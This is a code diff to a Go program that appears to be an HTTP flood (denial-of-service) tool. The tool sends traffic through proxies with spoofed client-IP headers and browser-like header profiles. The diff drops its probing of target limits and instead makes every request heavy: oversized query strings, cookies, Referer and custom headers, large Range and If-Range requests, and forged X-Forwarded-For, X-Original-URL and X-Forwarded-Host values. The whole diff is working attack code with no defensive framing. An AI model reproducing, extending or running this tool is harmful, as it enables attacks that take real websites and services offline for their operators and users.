@@ -164,12 +164,6 @@ type CLI struct {
 	ip     string
 }
 
-type Capabilities struct {
-	Headers map[string]bool
-	Range   bool
-	IfRange bool
-}
-
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 }
@@ -189,188 +183,6 @@ func RST(rng *rand.Rand, length int) string {
 
 var customCookie string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
-
-func Detect_Pyload(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	sizes := []int{64, 128, 256, 512, 1024}
-	lastSuccess := 0
-	for _, size := range sizes {
-		testURL := target
-		if strings.Contains(testURL, "?") {
-			testURL += "&big=" + strings.Repeat("x", size)
-		} else {
-			testURL += "?big=" + strings.Repeat("x", size)
-		}
-		req, _ := http.NewRequest("GET", testURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		resp, err := client.Do(req)
-		if err != nil {
-			break
-		}
-		resp.Body.Close()
-		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			lastSuccess = size
-		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
-			break
-		} else {
-			break
-		}
-	}
-	return lastSuccess
-}
-
-func Detect_Header_Support(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	sizes := []int{512, 1024}
-	lastSuccess := 0
-	for _, size := range sizes {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
-		resp, err := client.Do(req)
-		if err != nil {
-			break
-		}
-		resp.Body.Close()
-		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			lastSuccess = size
-		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
-			break
-		} else {
-			break
-		}
-	}
-	return lastSuccess
-}
-
-func Detect_Headers_Costum(target string, proxyIP string) Capabilities {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	parsedTarget, _ := url.Parse(target)
-	targetHost := parsedTarget.Hostname()
-	if proxyIP == "" {
-		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
-	}
-
-	headerList := []string{
-		"X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop",
-		"CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP",
-		"X-Originating-IP", "X-Forwarded-Proto", "X-Forwarded-Port",
-		"X-Forwarded-Scheme", "X-Requested-With", "Accept-Charset",
-		"Accept-Datetime", "From", "Max-Forwards", "Via", "Warning",
-		"DNT", "Upgrade", "Save-Data", "X-HTTP-Method-Override", "X-Cache",
-	}
-	result := make(map[string]bool)
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-
-	for _, h := range headerList {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		switch h {
-		case "X-Original-URL":
-			req.Header.Set("X-Original-URL", "/"+RST(rng, 8))
-		case "X-Forwarded-Host":
-			req.Header.Set("X-Forwarded-Host", targetHost)
-		case "X-Request-ID":
-			req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
-		case "CDN-Loop":
-			req.Header.Set("CDN-Loop", "cloudflare")
-		case "CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-			req.Header.Set(h, proxyIP)
-		case "X-Forwarded-Proto":
-			req.Header.Set(h, "https")
-		case "X-Forwarded-Port":
-			req.Header.Set(h, "443")
-		case "X-Forwarded-Scheme":
-			req.Header.Set(h, "https")
-		case "X-Requested-With":
-			req.Header.Set(h, "XMLHttpRequest")
-		case "Accept-Charset":
-			req.Header.Set(h, "utf-8")
-		case "Accept-Datetime":
-			req.Header.Set(h, time.Now().Format(time.RFC1123))
-		case "From":
-			req.Header.Set(h, "t.me/ytdizflzye.com")
-		case "Max-Forwards":
-			req.Header.Set(h, "5")
-		case "Via":
-			req.Header.Set(h, "1.1 proxy")
-		case "Warning":
-			req.Header.Set(h, "199 - \"misc\"")
-		case "DNT":
-			req.Header.Set(h, "1")
-		case "Upgrade":
-			req.Header.Set(h, "websocket")
-		case "Save-Data":
-			req.Header.Set(h, "on")
-		case "X-HTTP-Method-Override":
-			req.Header.Set(h, "PUT")
-		case "X-Cache":
-			req.Header.Set(h, "MISS")
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			result[h] = false
-			continue
-		}
-		resp.Body.Close()
-		code := resp.StatusCode
-		if code >= 200 && code < 400 {
-			result[h] = true
-		} else if code == 400 || code == 413 || code == 431 || code == 501 {
-			result[h] = false
-		} else {
-			result[h] = true
-		}
-	}
-
-	rangeSupported := false
-	req, _ := http.NewRequest("GET", target, nil)
-	req.Header.Set("Range", "bytes=0-0")
-	resp, err := client.Do(req)
-	if err == nil {
-		if resp.StatusCode == http.StatusPartialContent ||
-			(resp.StatusCode == http.StatusOK && resp.Header.Get("Content-Range") != "") {
-			rangeSupported = true
-		}
-		resp.Body.Close()
-	}
-
-	ifRangeSupported := false
-	if rangeSupported {
-		req, _ = http.NewRequest("GET", target, nil)
-		req.Header.Set("Range", "bytes=0-0")
-		req.Header.Set("If-Range", `"fake-etag-`+RST(rng, 8)+`"`)
-		resp, err = client.Do(req)
-		if err == nil {
-			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusPartialContent {
-				ifRangeSupported = true
-			}
-			resp.Body.Close()
-		}
-	}
-
-	return Capabilities{
-		Headers: result,
-		Range:   rangeSupported,
-		IfRange: ifRangeSupported,
-	}
-}
 
 func main() {
 	log.SetOutput(io.Discard)
@@ -415,15 +227,6 @@ func main() {
 	if len(proxies) == 0 {
 		proxies = append(proxies, nil)
 	}
-
-	var proxyIP string
-	if len(proxies) > 0 && proxies[0] != nil {
-		proxyIP = proxies[0].Hostname()
-	}
-
-	maxPayload := Detect_Pyload(tgt)
-	maxHeader := Detect_Header_Support(tgt)
-	caps := Detect_Headers_Costum(tgt, proxyIP)
 
 	wcs := make([]CLI, len(proxies))
 	for i, proxyURL := range proxies {
@@ -521,16 +324,9 @@ func main() {
 							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
 						}
 
-						if maxPayload > 0 && subRng.Intn(3) == 0 {
-							size := maxPayload / 2
-							if size < 1 {
-								size = 64
-							}
-							reqURL += "&big=" + strings.Repeat("x", size)
-						}
-
-						if subRng.Intn(10) == 0 {
-							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
+						reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
+						if subRng.Intn(2) == 0 {
+							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 2048+subRng.Intn(2048))
 						}
 
 						req, _ := http.NewRequest("GET", reqURL, nil)
@@ -542,78 +338,46 @@ func main() {
 						headerMap["Accept-Language"] = prof.Lang
 						headerMap["Accept-Encoding"] = prof.Encoding
 						headerMap["Connection"] = "keep-alive"
-						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
-						headerMap["Pragma"] = "no-cache"
-						headerMap["Upgrade-Insecure-Requests"] = "1"
-						headerMap["If-Modified-Since"] = ifModifiedSince
-						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
 
+						ref := REF[subRng.Intn(len(REF))]
+						ref += RST(subRng, 20) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
+						headerMap["Referer"] = ref
+
+						pid := cli.ip
+						if pid == "" {
+							pid = RIP(subRng)
+						}
 						if subRng.Intn(2) == 0 {
-							randHeader := "X-" + RST(subRng, 8)
-							headerMap[randHeader] = RST(subRng, 16)
+							headerMap["X-Forwarded-For"] = pid + ", " + RIP(subRng) + ", " + RIP(subRng)
+						} else {
+							headerMap["X-Forwarded-For"] = pid
+						}
+						headerMap["X-Real-IP"] = pid
+
+						start := subRng.Intn(10000)
+						end := start + 10000000 + subRng.Intn(50000000)
+						headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
+						if subRng.Intn(2) == 0 {
+							headerMap["If-Range"] = `"` + RST(subRng, 20) + `"`
+						} else {
+							past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
+							headerMap["If-Range"] = past
 						}
 
-						if subRng.Intn(4) == 0 {
-							bigCookie := "big=" + strings.Repeat("x", 512+subRng.Intn(1024))
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + bigCookie
-							} else {
-								headerMap["Cookie"] = bigCookie
-							}
-						}
+						size := 4096 + subRng.Intn(4096)
+						headerMap["X-Large-Data"] = strings.Repeat("x", size)
 
-						if subRng.Intn(4) == 0 {
-							ref := REF[subRng.Intn(len(REF))]
-							ref += RST(subRng, 16) + "=" + strings.Repeat("x", 256+subRng.Intn(512))
-							headerMap["Referer"] = ref
-						}
-
-						if caps.Range && subRng.Intn(4) == 0 {
-							start := subRng.Intn(10000)
-							end := start + 5000000
-							headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
-							if caps.IfRange && subRng.Intn(2) == 0 {
-								if subRng.Intn(2) == 0 {
-									headerMap["If-Range"] = `"` + RST(subRng, 16) + `"`
-								} else {
-									past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
-									headerMap["If-Range"] = past
-								}
-							}
-						}
-
-						if subRng.Intn(5) == 0 {
-							headerMap["X-Real-IP"] = cli.ip
-						}
-
-						if maxHeader > 0 && subRng.Intn(2) == 0 {
-							size := maxHeader/2 + subRng.Intn(maxHeader/2)
-							if size < 1 {
-								size = 512
-							}
-							headerMap["X-Large-Data"] = strings.Repeat("x", size)
-						}
-
-						var cookies []string
+						cookieParts := []string{"big=" + strings.Repeat("x", 2048+subRng.Intn(2048))}
 						if customCookie != "" {
-							cookies = append(cookies, customCookie)
+							cookieParts = append(cookieParts, customCookie)
 						}
 						for _, name := range COOKIES {
 							if subRng.Intn(2) == 0 {
-								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
+								cookieParts = append(cookieParts, name+"="+strconv.FormatInt(subRng.Int63(), 16))
 							}
 						}
-						if len(cookies) > 0 {
-							if existing, ok := headerMap["Cookie"]; ok {
-								headerMap["Cookie"] = existing + "; " + strings.Join(cookies, "; ")
-							} else {
-								headerMap["Cookie"] = strings.Join(cookies, "; ")
-							}
-						}
-
-						if subRng.Intn(8) != 0 {
-							ref := REF[subRng.Intn(len(REF))]
-							headerMap["Referer"] = ref + host
+						if len(cookieParts) > 0 {
+							headerMap["Cookie"] = strings.Join(cookieParts, "; ")
 						}
 
 						if prof.SecChUa != "" {
@@ -621,17 +385,19 @@ func main() {
 							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
 							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
 						}
-
 						headerMap["Sec-Fetch-Site"] = "none"
 						headerMap["Sec-Fetch-Mode"] = "navigate"
 						headerMap["Sec-Fetch-Dest"] = "document"
 
-						PID := cli.ip
-						if PID == "" {
-							PID = RIP(subRng)
+						if subRng.Intn(2) == 0 {
+							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
 						}
-						headerMap["X-Forwarded-For"] = PID
-						headerMap["X-Real-IP"] = PID
+						if subRng.Intn(3) == 0 {
+							headerMap["X-Original-URL"] = "/" + RST(subRng, 20)
+						}
+						if subRng.Intn(3) == 0 {
+							headerMap["X-Forwarded-Host"] = RST(subRng, 10) + ".example.com"
+						}
 
 						for k, v := range headerMap {
 							req.Header.Set(k, v)
